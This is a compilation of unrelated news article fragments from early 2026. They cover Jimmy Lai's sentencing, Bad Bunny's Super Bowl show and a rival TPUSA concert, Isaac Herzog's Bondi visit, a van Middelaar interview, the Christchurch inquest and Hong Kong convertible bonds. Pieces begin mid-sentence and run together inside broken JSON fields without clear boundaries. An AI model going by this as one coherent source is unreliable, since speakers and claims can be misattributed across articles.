former Jacinda Ardern-led government banned military-style semi-automatic rifles and created a firearms registry. An inquiry into the attacks is the largest coronial investigation New Zealand has seen and is still under way. In October 2025, the high court left the door open for Tarrant to be called as a witness at the inquest, despite objections from survivors and families of the victims.

A political theorist and historian by trade, he has written several books and was in the cabinet of the first European Council president Herman Van Rompuy . Van Middelaar is widely read and cited across Europe for his analysis of the EU’s political evolution, with his books translated into many languages and awarded major European literary prizes. He writes regularly for leading newspapers including Le Monde, The Guardian, Die Zeit and others, shaping debate on European strategy and geopolitics beyond academia and Brussels policy circles.

What has the start of 2026 told you about the state of geopolitics in Europe? Advertisement We have seen an incredible acceleration in these first few weeks of the new year on the side of US President Donald Trump and Washington to start executing his offensive, almost imperial and ideological agenda. It has been laid out ever since his inauguration a year ago, all the way up to the National Security Strategy (NSS) of December, but it’s like now he’s going into execution mode, with Venezuela and Greenland being the two most visible signs of that.

      "content": "Save Story Save this story Save Story Save this story during Bad Bunny’s electrifying halftime performance at Super Bowl LX, a crowd of what appeared to be fewer than 200 people in an undisclosed location were treated to an alternative concert, “The All-American Halftime Show,” presented by the right-wing student organization Turning Point USA. Conceived as culture-war counterprogramming for a show by a Puerto Rican mega-star who raps and sings in Spanish, and has been a vocal critic of ICE, the event featured four MAGA-aligned country stars and was headlined by Kid Rock, who made his entrance in jorts and trademark fedora. But for all the ideological outrage behind this challenge to globally popular Latin music, TPUSA’s star-spangled jamboree wasn’t particularly message-driven nor even provocative. It streamed on platforms including Rumble, DailyWire+, and multiple YouTube channels. Blake Neff, producer of The Charlie Kirk Show , claimed there were over 5 million live viewers on the Turning Point USA YouTube stream; as of publication time, it has been viewed over 16 million times. Shortly before going live, TPUSA announced that it would not be able to air the special on X due to “licensing issues.” Super Bowl LX, meanwhile, was expected to draw as many as 130 million viewers. Though largely framed as a memorial to Charlie Kirk, the TPUSA founder killed in September during a campus talk, “The All-American Halftime Show” included no appearance by his widow, Erika Kirk, who has been on an extended media tour since her husband’s death. President Trump did not comment directly on the concert, choosing instead to rant about Bad Bunny’s performance. “The Super Bowl Halftime Show is absolutely terrible, one of the worst, EVER!” Trump wrote on his digital platform, Truth Social. “It makes no sense, is an affront to the Greatness of America, and doesn’t represent our standards of Success, Creativity, or Excellence. Nobody understands a word this guy is saying, and the dancing is disgusting, especially for young children that are watching from throughout the U.S.A., and all over the World.” These comments came amid renewed scrutiny of Trump’s relationship with the late sex offender Jeffrey Epstein. The Democratic party’s official X account screenshotted Trump’s post about Bad Bunny, observing: “Guess he wasn’t watching Kid Rock then.” The livestream of the TPUSA event was preceded by a message from defense secretary Pete Hegseth, who said that the so-called Department of War was “proud to support” it. Viewers were also directed to a phone number they could call to “start or join a Turning Point USA chapter.” Comments on the stream were filled with remarks such as “Protect kids,” “No NFL on screen,” “GOD BLESS AMERICA,” and “JESUS.” Country singer Brantley Gilbert kicked off the concert, heavy on pyrotechnic visual effects throughout, rapping into a microphone with brass knuckles on it and performing the hit “Dirt Road Anthem,” which he cowrote but was originally made famous by Jason Aldean in 2010. It features the line “Better watch out for the boys in blue,” a reference to trouble with police. The crowd, some wearing MAGA hats, then swayed to a couple of tunes by Gabby Barrett, who won the 2021 Female Artist of the Year award at the Academy of Country Music Awards. Next came Lee Brice, who shouted out Kirk directly. “Charlie, he gave people microphones so they could say what was on their minds,” he declared before launching into a premiere performance of a new song called “Country Nowadays.” The lyrics included an allusion to gender politics. “I turn the TV on and sit and watch the evening news / Be told if I tell my own daughter that little boys ain’t little girls / I’d be up the creek in hot water,” he sang. The chorus noted: “It ain’t easy being country in this country nowadays.” The livestream concluded with more footage and recorded comments from Charlie Kirk, and a postscript stating that it was produced in “loving memory” of the TPUSA founder and CEO. “The All-American Halftime Show” was hyped in advance by Trump administration figures including health secretary Robert F. Kennedy Jr., who filmed an ad for the event with Kid Rock, and on Sunday night, conservative pundits like Matt Walsh and Megyn Kelly touted it as a massive victory for conservatives. But Trump and other influencers preferred to simply attack Bad Bunny. “Illegal aliens and Latin hookers twerking at the Super Bowl,” Trump ally Laura Loomer posted on X. “This isn’t White enough for me.” At least one Super Bowl attendee, the professional sports gambler Amanda Vance (who has no apparent relationship to Vice President JD Vance), uploaded a video of herself watching the TPUSA show on her phone while Bad Bunny performed on the field at Levi’s Stadium below her. “Watching the American halftime performance at the Super Bowl instead of Bad Bunny,” she captioned the clip on X. Vance received a number of mocking replies about how far back she was seated in the stadium. After the show, Kid Rock’s X account announced that his studio recording of “Til You Can’t” would be available to stream or purchase at midnight, offering thanks to the original songwriters “for giving me there [sic] blessing to record and release it.” The musician’s lean into MAGA politics in recent years has delivered mixed results. An upcoming multiday concert he was to headline in South Carolina was canceled this month as other bands dropped out of what figured to be an extremely politicized event. The run-up to the TPUSA halftime show also collided with the release of millions of documents pertaining to criminal investigations of Epstein, a coincidence that led to the resurfacing of his lyrics about having sex with underage girls in the 2001 song “Cool, Daddy Cool.” “Young ladies, young ladies,” Ritchie sings on the track. “I like ’em underage, see / Some say that’s statutory / But I say it’s mandatory.”",

      "content": "Listen to this article | 4 minsinfoJimmy Lai's family, lawyer, supporters and former colleagues have appealed for his release, warning he could die in prison, as he suffers from health conditions, including heart palpitations and high blood pressure [Kin Cheung/AP]By Al Jazeera Staff and News Agencies9 Feb 2026share2Share twitterwhatsappcopylinkA Hong Kong court has sentenced pro-democracy media tycoon Jimmy Lai to 20 years in jail under Beijing’s sweeping national security law, in a verdict that press and rights groups described as “cruel and profoundly unjust”. The sentence on Monday ends Hong Kong’s most high-profile national security hearing and a legal saga spanning almost five years. Lai, the founder ⁠of the now-shuttered Apple Daily newspaper, was first arrested in August 2020 and was found guilty late last year on two counts of foreign collusion and one count of seditious publication. Lai’s sentence of 20 years was within the most severe penalty “band” of 10 years to life imprisonment for offences of a “grave nature”. The Hong Kong court said Lai’s sentence was enhanced by the fact that he was the “mastermind” and driving force behind foreign collusion conspiracies. The 78-year-old, who is also a citizen of the United Kingdom, has denied all the charges against him, saying in court that he is a “political prisoner” facing persecution from Beijing. Given his age, the prison term could keep him behind bars for the rest of his life. Lai’s family, lawyer, supporters and former colleagues have warned that he could die in prison, as he suffers from health conditions, including heart palpitations and high blood pressure. Before Lai left the courtroom, he looked serious, as some people in the public gallery cried. In addition to Lai, six former senior Apple Daily staffers, an activist and a paralegal were also sentenced on Monday. His co-defendants received jail terms of between six years and three months, and 10 years. The convicted journalists are publisher Cheung Kim-hung, associate publisher Chan Pui-man, editor-in-chief Ryan Law, executive editor-in-chief Lam Man-chung, executive editor-in-chief responsible for English news Fung Wai-kong and editorial writer Yeung Ching-kee. “The rule of law has been completely shattered ⁠in Hong Kong. Today’s egregious decision is the final nail in the coffin for freedom of the press in Hong Kong,” said Jodie Ginsberg, CEO of the Committee to Protect Journalism. “The international community must step up its pressure to free Jimmy Lai if we want press freedom to be respected anywhere in the world.” Lai’s plight has also been criticised by global leaders, including United States President Donald Trump and UK Prime Minister Keir Starmer, who said he had raised Lai’s case during his meeting with Chinese President Xi Jinping in Beijing last month. “The harsh 20-year sentence against 78-year-old Jimmy Lai is effectively a death sentence,” said Elaine Pearson, the Asia director of Human Rights Watch. “A sentence of this magnitude is both cruel and profoundly unjust.” Beijing has previously dismissed such criticism as attempts to smear Hong Kong’s judicial system, while Hong Kong authorities maintain that Lai’s case “has nothing to do with freedom of speech and of the press”. Lai was one of the first prominent figures to be arrested under the security law, imposed by Beijing in 2020. Within a year, some of Apple Daily’s senior journalists were also arrested. Police raids, prosecutions and a freeze of its assets forced the newspaper’s closure in June 2021. Lai’s daughter, Claire, told The Associated Press news agency that she hopes authorities see the wisdom in releasing her father, a Roman Catholic. She said their faith rests in God. “We will never stop fighting until he is free,” she said. Ahead of the sentencing, Hong Kong Free Press reported that police detained a woman outside the West Kowloon court after finding an Apple Daily keychain in her possession. At least two other activists were also searched, including Tsang Kin-shing, a member of the now-disbanded League of Social Democrats. The sentencing comes against the backdrop of heightened restrictions on Hong Kong media. The Hong Kong Journalists Association said in 2024 that dozens of journalists faced “systematic and organised” harassment and intimidation, including leaked personal information and death threats. According to Reporters Without Borders, at least 900 Hong Kong journalists lost their jobs in the four years following the enactment of the national security law in the city.",

      "content": "Save Story Save this story Save Story Save this story its nearly 60-year history, putting on the Super Bowl halftime show gets harder. Sometimes the logistics get complicated by concerns about protecting the turf . On other occasions, some aspect of the show leaks online, as happened last year ahead of Kendrick Lamar’s performance . In the lead-up to Bad Bunny ’s performance at Super Bowl LX, I wondered if worries about the possible presence of Immigration and Customs Enforcement (ICE) agents at the Big Game would be the King of Latin Trap’s biggest hurdle. It wasn’t. It was trying to fulfill Bad Bunny’s wish to transform the field at Levi’s Stadium into his home of Puerto Rico. That one was Bruce and Shelley Rodgers’ problem to solve. Their company, Tribe Inc. , has been producing the show for nearly two decades, and the pair have become de facto experts in how to pull off increasingly elaborate stage productions during the allotted 26 or so minutes of the halftime show. For Sunday’s performance, situated in the middle of the Seattle Seahawks’ rematch against the New England Patriots, the issue was horticultural. Bad Bunny, whose real name is Benito Antonio Martínez Ocasio, wanted his show to have the same look and feel as his recent Puerto Rico residency, which covered stages in palm trees and sugar cane to re-create the environs of Vega Baja, where he grew up. In a different stadium, that could be done by rolling carts covered in those plants onto the field. But Santa Clara’s Levi’s Stadium, home of the San Francisco 49ers, uses natural grass; the National Football League ’s guidelines don’t allow that many carts onto the field, as they’d tear up the grass. The max the team could use was 25, and they needed those for the stages and other props. Bruce Rodgers’ fix was simple: dress people up like plants. As viewers saw at halftime, Bad Bunny, who performed in an all-white outfit with a number and “Ocasio” on the back like a football jersey, did get to dance around the set he wanted—the casita, the vintage truck, the wedding stage—but the plants were alive in a way he might not have imagined. Some 380 people donned costumes to make them look like tall stalks of grasses. The stationary palm trees and poles, if you’re wondering, were rolled out much in the same way the streetlights were placed for Lamar’s street scene from Super Bowl LIX. On Sunday, they hit their limit of 25 carts, equipped with so-called “ turf tires ,” and got everything safely on and off the field. The tall grass was actually people. Photograph: Darrell Jackson There were other obstacles, too. For instance, there’s only one main field tunnel at Levi’s Stadium—and the venue is open-air. Lamar was able to use the darkness provided by the Caesars Superdome for dramatic effect during his 2025 show , but Bad Bunny couldn’t do the same. “It’s all done in daylight,” says Shelley Rodgers, who serves as the show’s art director and won Emmys for her work on Rihanna’s halftime show in 2023 and the one that Dr. Dre headlined in 2022. “You don’t get the theatricality of nighttime.” Photograph: Darrell Jackson Photograph: Darrell Jackson As viewers saw on Sunday, the plan worked. Starting at the casita (where Pedro Pascal, Cardi B, and Colombian singer Karol G made cameos) and performing his way through the field, Bad Bunny sang a litany of hits, from “NUEVAYoL” to “Monaco.” He also danced with surprise guest Lady Gaga, who performed “Die With a Smile” during an elaborate wedding scene. (If you’re wondering, yes, that couple was real and about to get married. Benito has gotten hundreds of wedding invites from fans over the years, and he wanted to oversee at least one couple’s nuptials, Bruce Rodgers says.) He ended by carrying a football through the end zone followed by a parade of people carrying the flags of countries from throughout the Americas while the message “The only thing more powerful than hate is love” lit up the screen behind him. “It ties together the music and sports aspects,” says Shelley Rodgers. “It’s saying, ‘We’re all the same, and we’re all on this journey together.” A field plan showing the placement of stages, costumed cast members, and other equipment necessary to pull off Bad Bunny’s Super Bowl halftime show.

Bob Ross, the effects consultant who orchestrated the pyrotechnic display during the finale, says Sunday’s fiery arsenal was the biggest of any Super Bowl halftime show in the past two decades or so. All told, Bad Bunny’s set required 9,852 of what Ross calls “theatrical pyrotechnics,” like colored smoke and fireworks. This includes the finale’s massive Puerto Rican flags, which lit up the sky as the performers left the field. The point of the big ending was to build on the energy of the music, dancers, and Bad Bunny himself to make something “extremely dynamic,” Ross says. “We’re an exclamation mark to a performance.” For Bruce Rodgers, the institutional knowledge necessary to give artists what they want is hard-won. It all goes back to the first Super Bowl halftime show he ever worked on: Prince. That 2007 performance, which Prince famously performed in the Miami rain , brought the traditional theatrics of a stadium rock show to a football game. As the roster of halftime performers has expanded to include the likes of Rihanna and Lady Gaga , and concert tours have evolved into massive Vegas-style productions, Rodgers has had to push the limits of what can be done on the playing field in 26 minutes, while also managing the dreams of artists about to play for roughly 100 million people worldwide. Lady Gaga was there. Photograph: Darrell Jackson “We’re in a frenzy of a world now show-business-wise, where everybody knows that artists can pull off great things,” Bruce Rodgers says. “It makes our world a little tougher, because we still have seven-and-a-half minutes to get it in, a 12- or 13-minute show, and then six minutes to get it off.” Not only was Rodgers, who calls Bad Bunny a “sweetheart,” trying to not “squash any dreams” for the show, he and his wife were also working on a much more truncated timeline than in years past. Generally, the artists’ concept for the halftime show gets approved around Thanksgiving. Then the team has a couple of months to fabricate, source set pieces, and figure out all the logistics. This time around, it wasn’t approved until around the new year—partially because of negotiations between what Bad Bunny was hoping for (those carts full of vegetation) and the solution the Rodgers’ provided (hundreds of costumed extras). “It was very dramatic and intense,” Bruce Rodgers says. But ultimately it made a better show. Nick Pappas, the NFL’s field director, says that if you look at the total footprint of the show—carts, stages, costumed humans—”this might be our biggest one yet.” A props map showing the placement of various objects during Bad Bunny’s Super Bowl halftime show. All of these props need to be brought onto the playing field and subsequently taken off in a matter of minutes. Courtesy of Tribe Inc. Bad Bunny’s performance comes at a markedly fraught time for America and American sports. When the NFL announced in September that the superstar would be headlining the Super Bowl halftime show, MAGA influencers went on a social media campaign decrying the fact that he “doesn’t sing in English.” The artist, who took home three trophies at last weekend’s Grammys, has not performed in the continental US as part of his current world tour over fears of ICE raids happening at his concerts. As a longtime supporter of the LGBTQ+ community , there was speculation—and even betting lines —he would wear a dress during Sunday’s show. (He clearly didn’t.) A week before the Big Game, Bad Bunny became the first artist to win the Grammy for Album of the Year for an all-Spanish record. Earlier in the night, when DeBÍ TiRAR MáS FOToS won Best Música Urbana Album, he took the stage and said, “Before I say thanks to God, I’m going to say ‘ICE out.’ We’re not savage; we’re not animals; we’re not aliens. We are humans and we are Americans.” He got a standing ovation. Photograph: Darrell Jackson A few days after the NFL’s announcement last fall, Homeland Security secretary Kristi Noem’s chief adviser, Corey Lewandowski, went on the conservative podcast The Benny Show to say Game Day attendees could be subject to scrutiny from border patrol agents. “There is nowhere that you can provide safe haven to people who are in this country illegally,” Lewandowski said . “Not the Super Bowl and nowhere else.” The NFL stuck by its decision to have Bad Bunny headline. “Not everyone has to like everything we do,” the league’s chief marketing officer, Tim Ellis, told The Athletic . “Bad Bunny is fucking awesome.” Photograph: Ishika Samant/Getty Images Months later, the situation has only grown more tense. The Trump administration has beefed up ICE’s presence in several US cities, particularly Minneapolis. In January, ICE agents shot and killed US citizens on two separate occasions . Their deaths have sparked demonstrations across the country calling for the end of ICE actions. On the other side of the world in Italy, as Milan and Cortina d’Ampezzo were preparing to host the 2026 Winter Olympics , protesters took to city streets to decry ICE’s presence at the Games. US officials claim ICE agents are only in the country to aid in security—not perform immigration operations—but still hundreds of people showed up in Milan’s Piazza XXV Aprile on January 31 to demand they leave . Since the Games began, several American Olympic athletes have expressed conflicted feelings about competing for the US. According to the show's visual effects consultant Bob Ross, Bad Bunny’s set required 9,852 of what he calls “theatrical pyrotechnics.” Courtesy of Bob Ross Many of the pyrotechnics were placed around the perimeter of Levi's Stadium. Courtesy of Bob Ross Though President Trump attended Super Bowl LIX in New Orleans, he told the New York Post he will not attend this year’s game in the San Francisco Bay Area because it’s “ just too far away .” He was also irked at the inclusion of pregame performers Green Day, claiming the vocally anti-Trump band will “sow hatred.” Last Monday, Turning Point USA, the right-wing student organization cofounded by the late Charlie Kirk , announced the lineup for its own All-American Halftime Show, headlined by Trump supporter Kid Rock. The organization teased the event for months, billing it as an alternative to Bad Bunny’s set. In a press release, Kid Rock said he was approaching the show like David vs. Goliath (he’s David in this scenario): “[Bad Bunny] said he’s having a dance party, wearing a dress, and singing in Spanish? Cool. We plan to play great songs for folks who love America.” Photograph: PATRICK T. FALLON/ Getty Images Whatever backlash the NFL faces for Sunday’s performance, the league is poised to come out ahead , says Jared Bahir Browsh, the director of the Critical Sports Studies Program at the University of Colorado Boulder. The league has been growing its international audience of late, and Bad Bunny is a worldwide phenomenon. “As much as we have seen complaints about the conservatism of the NFL, their bottom line is still focused on revenue, and the publicity behind the pick (both good and bad) for Bad Bunny—and to a lesser extent Bay Area locals Green Day—is worth it,” he says. As folks gathered to watch one of the biggest American sports events on Sunday, excitement for Game Day was mixed with anxiety . To ensure safe viewing, the Working Families Party planned Super Bowl watch events in several US cities, including Los Angeles, Atlanta, Jersey City, Philadelphia, and Columbus, Ohio. “Events like these where fans can safely gather, organize, and celebrate together are becoming more and more vital,” organizers wrote in their announcement of the “Bad Bunny Bowl” watch parties. Photograph: Darrell Jackson Photograph: Darrell Jackson On Sunday, there was significant security in place for the game, and there were no reports of ICE immigration activities near Levi’s Stadium. Earlier in the week California governor Gavin Newsom said on Thursday that he had been assured there would be “ no immigration enforcement tied to the game .” The goal of Bad Bunny’s performance, Shelley Rodgers says, wasn’t to be overtly political or to respond directly to the response from the right. “It’s more about unity,” she says. Photograph: Kevin Sabitus/Getty Images Bruce Rodgers notes that a lot of the statements Bad Bunny wanted to make about inclusiveness around the show were made with the teaser he released last month. “It’s a really fucking cool message,” Rodgers says. “I think he knows that people are going to make news out of whatever he does; the illuminati guys on YouTube will make illuminati stories,” so the point was to keep the show’s message straightforward. Bad Bunny performed in Spanish. Fans danced. More than 100 million people watched. Then the game resumed, and the internet got flooded with commentary and hot takes. Photograph: KARL MONDON/Getty Images Prior to the game, pro boxer/influencer Jake Paul posted on X that he was “purposefully turning off the halftime show,” calling Bad Bunny a “fake American citizen … who publicly hates America.” As a Puerto Rican, Bad Bunny is a US citizen. Paul and his brother Logan both have posted videos from their multimillion-dollar homes in Puerto Rico. President Trump critiqued the halftime show on Truth Social , calling it “absolutely terrible, one of the worst, EVER.” About Bad Bunny, he posted: “Nobody understands a word this guy is saying.” Several folks on X seemed to think Bad Bunny’s “Ocasio” jersey was for US representative Alexandria Ocasio-Cortez rather than the artist’s last name. Others, meanwhile, noted that Bad Bunny was the only one performing well at the Super Bowl given the relatively low score at halftime (the Patriots ended the half without scoring a single point).

Courtesy of Tribe Inc. When we spoke before the Super Bowl, Bruce Rodgers brought up Left Shark, the awkward dancer in a shark suit who upstaged Katy Perry during her 2015 performance and became an internet talking point for weeks after. Tribe Inc., of course, also designed that show. He wonders if Sunday’s plant costumes will take off in the same way. “Our team designed Left Shark, but as soon as that thing went viral, Katy Perry said she did it all,” Bruce Rodgers says, somewhat jokingly. “If these costumes are a success, I want my name on ’em, because it was my idea. If they’re not a success and a meme, then it was all Shelley’s idea. No, I’m kidding.” What Say You? Let us know what you think about this article in the comments below.

      "content": "Share Save Share Save Watch: Israel&#x27;s president lays wreath at Bondi Beach to honour shooting attack victims Israeli President Isaac Herzog has laid a wreath and two stones from Jerusalem at Bondi Beach, the site of a shooting that targeted a Jewish festival in December, at the start of a controversial visit. &quot;When one Jew is hurt, all Jews feel their pain,&quot; he said, adding he was there to &quot;embrace and console the bereaved families&quot;. Security has been tight for the four-day visit during which he will also travel to Canberra and Melbourne and meet Prime Minister Anthony Albanese. Senior Jewish leaders have said the trip will comfort a grieving community, but others have said he should not have been invited due to allegations he has incited genocide in Gaza. The president was invited by Albanese after the shooting at Bondi , in which 15 people were killed, including a 10-year-old girl, at an event celebrating Hanukkah. The prime minister has said the visit will contribute to social cohesion and a &quot;greater sense of unity&quot; after the Bondi attack but the visit is expected to be met with nationwide protests, including one in central Sydney on Monday evening. Organisers have said 5,000 people will attend the protest, which is expected to take place despite restrictions on protests brought in by the New South Wales government after the Bondi attack. Just half an hour before the protest was due to begin, the Palestine Action Group on Monday lost a legal challenge to a decision by the state government to invoke rarely used &quot;major event&quot; powers during Herzog&#x27;s visit. They give police additional powers, including the ability to close specific locations, the right to search people and the imposing of fines of up to $5,500 (£2,839, US$3,862) for non-compliance. Police meanwhile said they had &quot;dealt with&quot; four people as part of their Bondi Beach operation during Herzog&#x27;s visit including one man who yelled &quot;shame&quot; at Herzog and was issued with a move on direction by police under the major event act, according to the Sydney Morning Herald. Another man was arrested and charged with stalk/intimidate and behaving in an offensive manner in a public place after allegedly abusing other passengers on a bus. Getty Images Israeli President Isaac Herzog and his wife Michal pay their respects to the Bondi attack victims Alex Ryvchin, co-chair executive of Australia&#x27;s peak Jewish body, the Executive Council of Australian Jewry, on Monday said Herzog&#x27;s visit was warmly welcomed. &quot;For the victim families and for the survivors [of the Bondi attack], it means a great deal,&quot; he said. &quot;His visit will lift the spirits of a pained community and we hope will lead to a much-needed recalibration of bilateral relations between two historic allies,&quot; he said. Israeli Prime Minister Benjamin Netanyahu accused Australia last year of having &quot;betrayed Israel&quot; and called Albanese &quot;weak&quot; for recognising Palestine as a state, alongside other countries including the UK and France. But other groups, including the Jewish Council of Australia (JCA), set up in 2024 to call out antisemitism and support Palestinian freedom, and the Australian National Imams Council, have said Herzog should not have been invited. &quot;Inviting a foreign head of state who is implicated in an ongoing genocide as a representative of the Jewish community is deeply offensive and risks entrenching the dangerous and antisemitic conflation between Jewish identity and the actions of the Israeli state,&quot; said JCA executive officer Sarah Schwartz last week. &quot;This does not make Jews safer. It does the opposite.&quot; On Monday, a letter organised by the JCA and signed by 600 Australian Jews was published in the Sydney Morning Herald and the Age, saying Herzog &quot;does not speak for us and is not welcome here&quot;. Nasser Mashni, president of the Australia Palestine Advocacy Network, said in a post on X the visit was a &quot;very bitter pill to swallow&quot; and a &quot;dark day&quot;. Asked about the planned protests on Sunday, Albanese said &quot;people have a right to express their views. But I do want to make this point - that President Herzog is coming in the context of the devastating antisemitic terrorist attack that occurred at Bondi.&quot; Getty Pro-Palestinian protesters march against the visit of Israeli President Isaac Herzog in Sydney on Sunday. A UN commission last year concluded that Herzog was among Israeli leaders who had &quot;incited the commission of genocide&quot; in their speeches and statements. He had stated that &quot;it&#x27;s an entire nation out there that is responsible&quot; for the 7 October 2023 Hamas attack on Israel, and has also been pictured signing a shell to be dropped on Gaza. His comments formed part of the legal case brought by South Africa in the International Court of Justice accusing Israel of genocide in Gaza. Herzog has condemned the UN report, which he said took his words out of context, while the Israeli foreign minister called it &quot;distorted and false&quot;. The UN commission said Herzog&#x27;s later clarification of his statement, that &quot;there are many, many innocent Palestinians who don&#x27;t agree&quot; was &quot;provided to deflect responsibility for the initial statement&quot;. Israel denies it has committed genocide in Gaza. Chris Sidoti, an Australian human rights lawyer and a member of the UN commission which wrote the report, on Thursday called for Herzog to be arrested, arguing the immunity traditionally granted to heads of state should not apply to &quot;atrocity crimes&quot; such as genocide. Some federal MPs have also raised objections to the visit, while some state Labor MPs - both the state and federal government are Labor - have said they will join the Sydney march. Asked about the planned protests on Monday, Herzog said: &quot;I have come here in goodwill and in a message that ... Australia and Israel are close friends and allies since the days of old. &quot;These demonstrations in most cases, what you hear and see, comes to undermine and delegitimise our right, my nation&#x27;s right ... of its mere existence and it&#x27;s contradictory to whatever was said and done by Australia.&quot; He also said the &quot;current rise in antisemitism around the world is a global emergency&quot; adding: &quot;Hatred that starts with the Jews never ends with the Jews&quot;.

      "content": "Advertisement Bonds Business Hong Kong firms rush to issue convertibles – and trend could continue, bankers say Issuers raised US$7.4 billion in convertibles in early 2026, nearly half of last year’s total, as they rushed to lock in high share prices Reading Time: 3 minutes Why you can trust SCMP Cao Li Published: 10:30am, 9 Feb 2026 A growing number of Hong Kong-listed companies are tapping strong equity market sentiment to issue convertible bonds, a trend bankers expect to continue. Eleven companies raised US$7.4 billion through convertible bonds in the first five weeks of 2026, about 47 per cent of last year’s US$16 billion total, according to Dealogic. Tianqi Lithium, one of the world’s largest producers of lithium-ion battery materials, announced on Wednesday that it would raise about HK$5.9 billion (US$755 million) from a combination of share placement and a convertible bond. That came a day after leading Chinese broker Huatai Securities said it would raise HK$10 billion through a convertible bond. Earlier, Chinese sportswear group Xtep said it would issue HK$500 million in convertible bonds to institutional investors. Advertisement “The volume has been pretty crazy since the beginning of January,” said Olivia Li, who leads the Greater China equity-linked business at Citi. The number of companies rushing to issue convertible bonds was growing and bankers were busy with deals even as the Lunar New Year approached, market players said. Advertisement “The key reason is that the equity market has started pretty strong this year,” said Li. “So everyone is trying to take advantage of the current high share prices to raise money by issuing equity-linked instruments, such as convertible bonds.” Convertible bonds are securities that can be converted into shares at a predetermined price, typically set at a premium to the current share price. When share prices are high, issuers can fix a higher conversion price, and investors gain more confidence that the stock will rise enough to make conversion worthwhile.

Photograph: Vincent Yu/AP View image in fullscreen Jimmy Lai is arrested by police at his home in April 2020. The media tycoon was sentenced to 20 years in prison on Monday. Photograph: Vincent Yu/AP Jimmy Lai, Hong Kong pro-democracy figure, sentenced to 20 years in prison for national security offences Family of media tycoon say he will ‘die a martyr behind bars’, amid widespread criticism from press freedom groups Jimmy Lai, the media mogul and prominent pro-democracy activist, has been sentenced to 20 years in prison in Hong Kong for national security offences, a punishment his daughter said could mean “he will die a martyr behind bars”. Claire Lai said the sentence was “heartbreakingly cruel” given her 78-year-old father’s declining health, while her brother Sebastien Lai called the sentence “draconian” and “devastating”. The sentencing is the culmination of a years-long saga that critics say represents Hong Kong’s transformation from a mostly free city to one where dissent is fiercely suppressed by the Chinese Communist party-controlled authorities. Lai was convicted in December on charges of sedition and conspiracy to collude with foreign forces. He had pleaded not guilty to all charges. The collusion convictions carry a maximum penalty of life imprisonment.

Photograph: Tyrone Siu/Reuters Lai’s 20-year sentence is the harshest penalty handed down for national security offences in Hong Kong. The rise and fall of Jimmy Lai, whose trajectory mirrored that of Hong Kong itself Read more The sentence was condemned immediately by Taiwan, as well as press freedom and human rights groups. Reporters Without Borders said: “Today, the curtain falls on press freedom in Hong Kong … This court decision underscores the complete collapse of press freedom in Hong Kong and the authorities’ profound contempt for independent journalism.” Human Rights Watch said the length of jail time given to Lai was “effectively a death sentence”. “A sentence of this magnitude is both cruel and profoundly unjust. Lai’s years of persecution show the Chinese government’s determination to crush independent journalism and silence anyone who dares to criticise the Communist party,” the statement said. Amnesty International called the case “another grim milestone in Hong Kong’s transformation from a city governed by the rule of law to one ruled by fear”. View image in fullscreen Members of the media outside the West Kowloon magistrates courts in Hong Kong on Monday. Photograph: May James/EPA Hong Kong’s chief executive, John Lee, said on Monday the sentencing of Lai was “deeply gratifying”. “Jimmy Lai’s crimes are heinous and evil in the extreme. His heavy sentence of 20 years’ imprisonment demonstrates the rule of law, upholds justice and is deeply gratifying,” he said. Steve Li, the chief superintendent of the police national security department, said the sentence was “appropriate” and alleged that claims about Lai’s frail health were “exaggerated”. Beijing’s foreign affairs spokesperson Lin Jian said the sentence was “legitimate” and “reasonable”. Li said: “Hong Kong is a society governed by the rule of law … there is no room for argument.” Lai’s prosecution has been described as politically motivated by human rights groups and the British government, which has called for his release. The UK foreign secretary, Yvette Cooper, said: “For the 78-year-old, this is tantamount to a life sentence”. Cooper called for Lai to be released from his “appalling ordeal” on humanitarian grounds. “The prime minister raised Mr Lai’s case directly with President Xi during his visit. That has opened up discussion of our most acute concerns directly with the Chinese government, at the highest levels,” said Cooper. “Following today’s sentencing we will rapidly engage further on Mr Lai’s case.” On Friday, Chinese state media described Lai, a British citizen who has lived in Hong Kong since he fled China as a child refugee, as an “anti-government instigator and traitor”. Lai is the founder of the now-defunct Apple Daily, a popular Hong Kong newspaper that supported the pro-democracy movement that swelled in the city in the 2010s. The movement was crushed in June 2020 by the imposition of a harsh national security law that criminalised most forms of dissent. The authorities said the law was necessary to restore stability to the city. Lai was arrested and charged under that law in August that year. Apple Daily was forced to close in 2021. Keir Starmer said that he raised Lai’s case when he met China’s leader, Xi Jinping, in Beijing in January. But it is not clear what, if any, progress the UK has made towards securing Lai’s release. Sebastien Lai said recently that the UK government had not done enough for his father and that “time is running out”. View image in fullscreen Sebastien Lai at a media briefing in December. Photograph: Jill Mead/The Guardian The US president, Donald Trump, has also said that he would secure Lai’s release. The chair of the US select committee on China, John Moolenaar, said: “President Trump made it abundantly clear to General Secretary Xi in October that Lai should be freed and allowed to leave Hong Kong to be with his family … If General Secretary Xi wants to improve his relationship with the United States, freeing Jimmy Lai is where he needs to start.” Lai’s supporters hope that negotiations can now start in earnest for him to be released on health grounds. There are increasing concerns about Lai’s health and wellbeing in prison. His family said he had suffered dramatic weight loss and that his teeth had rotted. He has been behind bars since December 2020, mostly in solitary confinement. Hong Kong authorities say Lai has received appropriate medical care and that he requested to be kept separate from other prisoners. Lai was sentenced along with eight other co-defendants – two activists and six former executives from Lai’s media company – in the landmark national security trial, all of whom pleaded guilty. They were handed sentences ranging from six years and three months to 10 years. Mark Clifford, the president of the Committee for Freedom in Hong Kong and author of a biography of Lai titled The Troublemaker, said: “The heavy sentences meted out not only to Lai but to his six Apple Daily colleagues underscore China’s lack of concern about Hong Kong’s rule of law ... The British government needs to redouble its efforts to free Lai on humanitarian grounds.” Clifford is a former executive in Lai’s media company and was referenced several times in the ruling against Lai. Lai’s trial was presided over by three judges handpicked by the government to hear national security cases. In their 855-page judgment convicting him, the judges said Lai was “a very savvy business man” and that it was “unfortunate that his deep resentment and hatred for the Chinese Communist party … led him down a thorny path”. Lai was accused of using Apple Daily and political connections, particularly in the US, to lobby for foreign governments to impose sanctions on China and Hong Kong after the crackdown on pro-democracy protests in 2019 and 2020. Lai said he never called for sanctions after the national security law had taken effect, as “it would be suicidal to do so”.

